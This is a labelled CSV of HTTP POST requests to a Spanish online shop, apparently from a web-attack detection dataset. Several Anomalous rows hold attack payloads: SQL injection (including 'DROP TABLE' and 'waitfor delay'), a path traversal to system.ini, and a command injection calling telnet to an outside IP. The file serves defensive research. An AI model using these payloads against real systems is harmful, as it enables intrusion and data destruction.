,Method,Connection,Accept,Accept-Charset,Accept-Language,Cache-control,Pragma,User-Agent,Content-Type,POST-Data,Request,Class
7935,POST,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),application/x-www-form-urlencoded,modo=registro&login=erh-huan4&password=0u3it8&nombre=Basiana&apellidos=Castany+Bigorra&email=balsamo%40chicashumedas.aw&dni=81192846V&direccion=Urbanizacion+Santo+Domingo+De+La+Calzada+113+6H&ciudad=Alberguer%EDa+de+Arga%F1%E1n%2C+La&cp=22760&provincia=Bur%3Fgo%3Fs&ntc=0768342745697395&B1=Registrar,"closetext/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5utf-8, utf-8;q=0.5, *;q=0.5enno-cacheno-cachemozilla/5.0 (compatible; konqueror/3.5; linux) khtml/3.5.8 (like gecko)application/x-www-form-urlencodedmodo=registro&login=erh-huan4&password=0u3it8&nombre=basiana&apellidos=castany+bigorra&email=balsamo%40chicashumedas.aw&dni=81192846v&direccion=urbanizacion+santo+domingo+de+la+calzada+113+6h&ciudad=alberguer%eda+de+arga%f1%e1n%2c+la&cp=22760&provincia=bur%3fgo%3fs&ntc=0768342745697395&b1=registrar",Anomalous
415,POST,keep-alive,"application/*;q=0.4, application/*, application/*;q=0.3",*;q=0.3,non-standard,min-fresh=5,no-cache,Mozilla/5.8 (Windows; U; Win98 8.7; iU-tu; rv:9.1.3) Gecko/29636681,application/x-www-form-urlencoded,ebeR0hn0mogd=](0Edgdii1eius    l&nt=743&vxp=tol&lnuheqtn0t4=eEpulztlroi>&y9EbbodymH=07668&tp=eeosueAlsesekc7r&hoeh='   ;  telnet  6.166.38.59  80  ;&atnLkht=~8doseits7 -t&eiro=yhBd1&nteoar4egpsntc=SieS%&hgtlla=asnodewfewejeap&enacruhunrnshie=lses,"keep-aliveapplication/*;q=0.4, application/*, application/*;q=0.3*;q=0.3non-standardmin-fresh=5no-cachemozilla/5.8 (windows; u; win98 8.7; iu-tu; rv:9.1.3) gecko/29636681application/x-www-form-urlencodedeber0hn0mogd=](0edgdii1eius    l&nt=743&vxp=tol&lnuheqtn0t4=eepulztlroi>&y9ebbodymh=07668&tp=eeosuealsesekc7r&hoeh='   ;  telnet  6.166.38.59  80  ;&atnlkht=~8doseits7 -t&eiro=yhbd1&nteoar4egpsntc=sies%&hgtlla=asnodewfewejeap&enacruhunrnshie=lses",Anomalous
9058,POST,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),application/x-www-form-urlencoded,modo=entrar&login=chihchie&pwd=s927r%ED9i0oAND+1%3D1&remember=off&B1=Entrar,"closetext/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5utf-8, utf-8;q=0.5, *;q=0.5enno-cacheno-cachemozilla/5.0 (compatible; konqueror/3.5; linux) khtml/3.5.8 (like gecko)application/x-www-form-urlencodedmodo=entrar&login=chihchie&pwd=s927r%ed9i0oand+1%3d1&remember=off&b1=entrar",Anomalous
5630,POST,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),application/x-www-form-urlencoded,modo=insertar&precio=3299&B1=Confirmar%2F,"closetext/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5utf-8, utf-8;q=0.5, *;q=0.5enno-cacheno-cachemozilla/5.0 (compatible; konqueror/3.5; linux) khtml/3.5.8 (like gecko)application/x-www-form-urlencodedmodo=insertar&precio=3299&b1=confirmar%2f",Anomalous
13835,POST,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),application/x-www-form-urlencoded,errorMsg=Credenciales+incorrectas,"closetext/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5utf-8, utf-8;q=0.5, *;q=0.5enno-cacheno-cachemozilla/5.0 (compatible; konqueror/3.5; linux) khtml/3.5.8 (like gecko)application/x-www-form-urlencodederrormsg=credenciales+incorrectas",Valid
7383,POST,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),application/x-www-form-urlencoded,modo=insertar&precioA=8345&B1=Confirmar,"closetext/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5utf-8, utf-8;q=0.5, *;q=0.5enno-cacheno-cachemozilla/5.0 (compatible; konqueror/3.5; linux) khtml/3.5.8 (like gecko)application/x-www-form-urlencodedmodo=insertar&precioa=8345&b1=confirmar",Anomalous
7724,POST,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),application/x-www-form-urlencoded,modo=registro&login=nady&password=9va3831&nombre=Shirley&apellidos=Urbaez+Mariangel&email=erlich-jarrel%40modeloscaninos.ni&dni=39759775C&direccionA=Algarrobo+197+3%3FF&ciudad=Navalonguilla&cp=50268&provincia=Segovia&ntc=5083698855321760&B1=Registrar,"closetext/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5utf-8, utf-8;q=0.5, *;q=0.5enno-cacheno-cachemozilla/5.0 (compatible; konqueror/3.5; linux) khtml/3.5.8 (like gecko)application/x-www-form-urlencodedmodo=registro&login=nady&password=9va3831&nombre=shirley&apellidos=urbaez+mariangel&email=erlich-jarrel%40modeloscaninos.ni&dni=39759775c&direcciona=algarrobo+197+3%3ff&ciudad=navalonguilla&cp=50268&provincia=segovia&ntc=5083698855321760&b1=registrar",Anomalous
12177,POST,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),application/x-www-form-urlencoded,modo=entrar&login=rollins&pwd=cimia&remember=on&B1=Entrar,"closetext/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5utf-8, utf-8;q=0.5, *;q=0.5enno-cacheno-cachemozilla/5.0 (compatible; konqueror/3.5; linux) khtml/3.5.8 (like gecko)application/x-www-form-urlencodedmodo=entrar&login=rollins&pwd=cimia&remember=on&b1=entrar",Valid
8137,POST,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),application/x-www-form-urlencoded,id=1%257C,"closetext/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5utf-8, utf-8;q=0.5, *;q=0.5enno-cacheno-cachemozilla/5.0 (compatible; konqueror/3.5; linux) khtml/3.5.8 (like gecko)application/x-www-form-urlencodedid=1%257c",Anomalous
3932,POST,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),application/x-www-form-urlencoded,idA=2&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=1&B1=A%F1adir+al+carrito,"closetext/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5utf-8, utf-8;q=0.5, *;q=0.5enno-cacheno-cachemozilla/5.0 (compatible; konqueror/3.5; linux) khtml/3.5.8 (like gecko)application/x-www-form-urlencodedida=2&nombre=jam%f3n+ib%e9rico&precio=100&cantidad=1&b1=a%f1adir+al+carrito",Anomalous
8044,POST,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),application/x-www-form-urlencoded,modo=registro&login=montijo&password=mane79&nombre=Lihuen&apellidos=Bibiloni+Urdi&email=brion%40baybay.gi&dni=934A195AM&direccion=Gerona+89+&ciudad=Olocau+del+Rey&cp=16122&provincia=Valladolid&ntc=2304911329453006&B1=Registrar,"closetext/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5utf-8, utf-8;q=0.5, *;q=0.5enno-cacheno-cachemozilla/5.0 (compatible; konqueror/3.5; linux) khtml/3.5.8 (like gecko)application/x-www-form-urlencodedmodo=registro&login=montijo&password=mane79&nombre=lihuen&apellidos=bibiloni+urdi&email=brion%40baybay.gi&dni=934a195am&direccion=gerona+89+&ciudad=olocau+del+rey&cp=16122&provincia=valladolid&ntc=2304911329453006&b1=registrar",Anomalous
11431,POST,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),application/x-www-form-urlencoded,modo=registro&login=plamondo&password=escandia&nombre=Macaria&apellidos=De+Nigris+Collantes&email=zuri%40helicopter.com.info&dni=32794604P&direccion=Camino+Bola%2C+154%2C+6%3FE&ciudad=V%E9lez-Blanco&cp=04811&provincia=Guadalajara&ntc=4189551081402205&B1=Registrar,"closetext/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5utf-8, utf-8;q=0.5, *;q=0.5enno-cacheno-cachemozilla/5.0 (compatible; konqueror/3.5; linux) khtml/3.5.8 (like gecko)application/x-www-form-urlencodedmodo=registro&login=plamondo&password=escandia&nombre=macaria&apellidos=de+nigris+collantes&email=zuri%40helicopter.com.info&dni=32794604p&direccion=camino+bola%2c+154%2c+6%3fe&ciudad=v%e9lez-blanco&cp=04811&provincia=guadalajara&ntc=4189551081402205&b1=registrar",Valid
2386,POST,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),application/x-www-form-urlencoded,errorMsg=Credenciales+incorrectas%252B,"closetext/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5utf-8, utf-8;q=0.5, *;q=0.5enno-cacheno-cachemozilla/5.0 (compatible; konqueror/3.5; linux) khtml/3.5.8 (like gecko)application/x-www-form-urlencodederrormsg=credenciales+incorrectas%252b",Anomalous
16868,POST,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),application/x-www-form-urlencoded,modo=insertar&precio=9750&B1=Confirmar,"closetext/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5utf-8, utf-8;q=0.5, *;q=0.5enno-cacheno-cachemozilla/5.0 (compatible; konqueror/3.5; linux) khtml/3.5.8 (like gecko)application/x-www-form-urlencodedmodo=insertar&precio=9750&b1=confirmar",Valid
16581,POST,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),application/x-www-form-urlencoded,modo=registro&login=onufrak-&password=dem%F3tico&nombre=Savina&apellidos=Rodallegas+Mora&email=ozenne0%40automoviles-hibridos.net&dni=81954149C&direccion=C%2F+Maestra+Nacional+Vicenta+Belenguer%2C+198%2C+5%3FB&ciudad=Saelices+de+la+Sal&cp=06330&provincia=Alicante&ntc=4253598980163314&B1=Registrar,"closetext/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5utf-8, utf-8;q=0.5, *;q=0.5enno-cacheno-cachemozilla/5.0 (compatible; konqueror/3.5; linux) khtml/3.5.8 (like gecko)application/x-www-form-urlencodedmodo=registro&login=onufrak-&password=dem%f3tico&nombre=savina&apellidos=rodallegas+mora&email=ozenne0%40automoviles-hibridos.net&dni=81954149c&direccion=c%2f+maestra+nacional+vicenta+belenguer%2c+198%2c+5%3fb&ciudad=saelices+de+la+sal&cp=06330&provincia=alicante&ntc=4253598980163314&b1=registrar",Valid
10292,POST,close,"application/*, audio/*, audio/*;q=0.2",*;q=0.6,non-standard,no-transform,no-cache,Mozilla/9.2 (Machintosh; U; PPC Mac OS X 8.9; rg-to; rv:0.6.9) Gecko/48064510,application/x-www-form-urlencoded,sjp3sE6bqhwxefo=dsO9?cuar&x5jHochildeTAuGB=nhsrOEgioorhttae&8b=..\\..\\..\\..\\..\\..\\..\\..\\..\\WINDOWS\\system.ini,"closeapplication/*, audio/*, audio/*;q=0.2*;q=0.6non-standardno-transformno-cachemozilla/9.2 (machintosh; u; ppc mac os x 8.9; rg-to; rv:0.6.9) gecko/48064510application/x-www-form-urlencodedsjp3se6bqhwxefo=dso9?cuar&x5jhochildetaugb=nhsroegioorhttae&8b=..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\system.ini",Anomalous
11591,POST,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),application/x-www-form-urlencoded,modo=registro&login=zohair&password=2722E9c1&nombre=Adon%EDas&apellidos=Castelan+Barrenechea&email=bently%40livanis.lc&dni=99980508Z&direccion=Sant+Ciril%2C+128+&ciudad=Cortijos%2C+Los&cp=09640&provincia=Girona&ntc=0653583716531670&B1=Registrar,"closetext/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5utf-8, utf-8;q=0.5, *;q=0.5enno-cacheno-cachemozilla/5.0 (compatible; konqueror/3.5; linux) khtml/3.5.8 (like gecko)application/x-www-form-urlencodedmodo=registro&login=zohair&password=2722e9c1&nombre=adon%edas&apellidos=castelan+barrenechea&email=bently%40livanis.lc&dni=99980508z&direccion=sant+ciril%2c+128+&ciudad=cortijos%2c+los&cp=09640&provincia=girona&ntc=0653583716531670&b1=registrar",Valid
18121,POST,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),application/x-www-form-urlencoded,modo=entrar&login=radick&pwd=calma&remember=off&B1=Entrar,"closetext/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5utf-8, utf-8;q=0.5, *;q=0.5enno-cacheno-cachemozilla/5.0 (compatible; konqueror/3.5; linux) khtml/3.5.8 (like gecko)application/x-www-form-urlencodedmodo=entrar&login=radick&pwd=calma&remember=off&b1=entrar",Valid
565,POST,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),application/x-www-form-urlencoded,modo=entrar%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&login=jeanes&pwd=d%F3712&remember=on&B1=Entrar,"closetext/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5utf-8, utf-8;q=0.5, *;q=0.5enno-cacheno-cachemozilla/5.0 (compatible; konqueror/3.5; linux) khtml/3.5.8 (like gecko)application/x-www-form-urlencodedmodo=entrar%27%3b+drop+table+usuarios%3b+select+*+from+datos+where+nombre+like+%27%25&login=jeanes&pwd=d%f3712&remember=on&b1=entrar",Anomalous
19459,POST,keep-alive,"video/*;q=0.4, image/*;q=0.4, video/quicktime;q=0.0","cp-950;q=0.3, iso-2022-jp",non-standard,no-transform,invalid,invalid,application/x-www-form-urlencoded,dno=obMHFylJFwl&omt0iip=05180&7ieaJbih6ch= e''6[9di,"keep-alivevideo/*;q=0.4, image/*;q=0.4, video/quicktime;q=0.0cp-950;q=0.3, iso-2022-jpnon-standardno-transforminvalidinvalidapplication/x-www-form-urlencodeddno=obmhfyljfwl&omt0iip=05180&7ieajbih6ch= e''6[9di",Valid
19504,POST,keep-alive,"text/*, text/*","koi8;q=0.6, x-mac-chinesetrad, utf-8, euc-tw;q=0.7",*;q=0.1,only-if-cached,no-cache,Mozilla/5.7 (Windows; U; WinNT 3.7; as-Re; rv:5.7.0) Gecko/08135779,application/x-www-form-urlencoded,MJvP_25H=xAvaentm&cA3Rb007tnm=ecLLhGD9&ct4W2.shutdownpositionbh=t_Qg4kmJ4X&j@SoptbFBFe=766423&ziN5ssPnr=eeTakae6jnwpiN&hda4jon6SrmohoH=ssa1tec7ice2&crgytdmintnc=k4&bXdtmpFcat=etcc6nseva5gmn&dhr8rp=erasrfhdm&fvQpwvNZ_delete=vwindow.openAwn &ts= 1&t8n9abiqtuy=?Gw,"keep-alivetext/*, text/*koi8;q=0.6, x-mac-chinesetrad, utf-8, euc-tw;q=0.7*;q=0.1only-if-cachedno-cachemozilla/5.7 (windows; u; winnt 3.7; as-re; rv:5.7.0) gecko/08135779application/x-www-form-urlencodedmjvp_25h=xavaentm&ca3rb007tnm=ecllhgd9&ct4w2.shutdownpositionbh=t_qg4kmj4x&j@soptbfbfe=766423&zin5sspnr=eetakae6jnwpin&hda4jon6srmohoh=ssa1tec7ice2&crgytdmintnc=k4&bxdtmpfcat=etcc6nseva5gmn&dhr8rp=erasrfhdm&fvqpwvnz_delete=vwindow.openawn &ts= 1&t8n9abiqtuy=?gw",Valid
2414,POST,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),application/x-www-form-urlencoded,B2=%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,"closetext/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5utf-8, utf-8;q=0.5, *;q=0.5enno-cacheno-cachemozilla/5.0 (compatible; konqueror/3.5; linux) khtml/3.5.8 (like gecko)application/x-www-form-urlencodedb2=%27%2c%270%27%29%3bwaitfor+delay+%270%3a0%3a15%27%3b--",Anomalous
17399,POST,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),application/x-www-form-urlencoded,modo=registro&login=gieming&password=orientador&nombre=Max&apellidos=Labrin&email=diehl%40kpincentives.tn&dni=30675875Q&direccion=Glorieta+Sevilla%2C+136+8-A&ciudad=Gr%E1valos&cp=18370&provincia=Le%F3n&ntc=5071258732073840&B1=Registrar,"closetext/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5utf-8, utf-8;q=0.5, *;q=0.5enno-cacheno-cachemozilla/5.0 (compatible; konqueror/3.5; linux) khtml/3.5.8 (like gecko)application/x-www-form-urlencodedmodo=registro&login=gieming&password=orientador&nombre=max&apellidos=labrin&email=diehl%40kpincentives.tn&dni=30675875q&direccion=glorieta+sevilla%2c+136+8-a&ciudad=gr%e1valos&cp=18370&provincia=le%f3n&ntc=5071258732073840&b1=registrar",Valid
3325,POST,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),application/x-www-form-urlencoded,errorMsg=%252B,"closetext/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5utf-8, utf-8;q=0.5, *;q=0.5enno-cacheno-cachemozilla/5.0 (compatible; konqueror/3.5; linux) khtml/3.5.8 (like gecko)application/x-www-form-urlencodederrormsg=%252b",Anomalous
10840,POST,keep-alive,*/*;q=0.2,*,non-standard,max-age=7,no-cache,Mozilla/6.4 (X11; U; Linux i586 8.2; ue-ir; rv:6.2.1) Gecko/90450600,application/x-www-form-urlencoded,rywd5=i3tlwl&tf=evn6ak&mr5rnltsqtiANs=asOp&heaoehhoa='pt&aotgcTewBs8vsne=0733&ifnaxkEkn=rve&JKevalJfadminLservicesErAC=50019393&lop=hie,keep-alive*/*;q=0.2*non-standardmax-age=7no-cachemozilla/6.4 (x11; u; linux i586 8.2; ue-ir; rv:6.2.1) gecko/90450600application/x-www-form-urlencodedrywd5=i3tlwl&tf=evn6ak&mr5rnltsqtians=asop&heaoehhoa='pt&aotgctewbs8vsne=0733&ifnaxkekn=rve&jkevaljfadminlserviceserac=50019393&lop=hie,Valid
8861,POST,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),application/x-www-form-urlencoded,modo=entrar&loginA=arlen&pwd=maridablemente&remember=on&B1=Entrar,"closetext/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5utf-8, utf-8;q=0.5, *;q=0.5enno-cacheno-cachemozilla/5.0 (compatible; konqueror/3.5; linux) khtml/3.5.8 (like gecko)application/x-www-form-urlencodedmodo=entrar&logina=arlen&pwd=maridablemente&remember=on&b1=entrar",Anomalous
14946,POST,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),application/x-www-form-urlencoded,id=1,"closetext/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5utf-8, utf-8;q=0.5, *;q=0.5enno-cacheno-cachemozilla/5.0 (compatible; konqueror/3.5; linux) khtml/3.5.8 (like gecko)application/x-www-form-urlencodedid=1",Valid
19295,POST,close,"video/*;q=0.4, application/*;q=0.1",*;q=0.2,non-standard,no-store,no-cache,invalid,application/x-www-form-urlencoded,8k8L=tn&7efSbt=241717&Ymksos=s5jztY2f&lefOteIann=o57dttsreplacetm&tite=+n pf&yApsFdvarQpklibL=h049hmol7aa6&t3lun=861&hzanhkuiaet2h=nye7gts8aet&Aoz8ROC8=673011030&aTnre=t2eroirar9,"closevideo/*;q=0.4, application/*;q=0.1*;q=0.2non-standardno-storeno-cacheinvalidapplication/x-www-form-urlencoded8k8l=tn&7efsbt=241717&ymksos=s5jzty2f&lefoteiann=o57dttsreplacetm&tite=+n pf&yapsfdvarqpklibl=h049hmol7aa6&t3lun=861&hzanhkuiaet2h=nye7gts8aet&aoz8roc8=673011030&atnre=t2eroirar9",Valid
16854,POST,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),application/x-www-form-urlencoded,B2=Vaciar+carrito,"closetext/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5utf-8, utf-8;q=0.5, *;q=0.5enno-cacheno-cachemozilla/5.0 (compatible; konqueror/3.5; linux) khtml/3.5.8 (like gecko)application/x-www-form-urlencodedb2=vaciar+carrito",Valid
3643,POST,close,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","utf-8, utf-8;q=0.5, *;q=0.5",en,no-cache,no-cache,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),application/x-www-form-urlencoded,modo=insertar&precioA=7651&B1=Confirmar,"closetext/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5utf-8, utf-8;q=0.5, *;q=0.5enno-cacheno-cachemozilla/5.0 (compatible; konqueror/3.5; linux) khtml/3.5.8 (like gecko)application/x-www-form-urlencodedmodo=insertar&precioa=7651&b1=confirmar",Anomalous
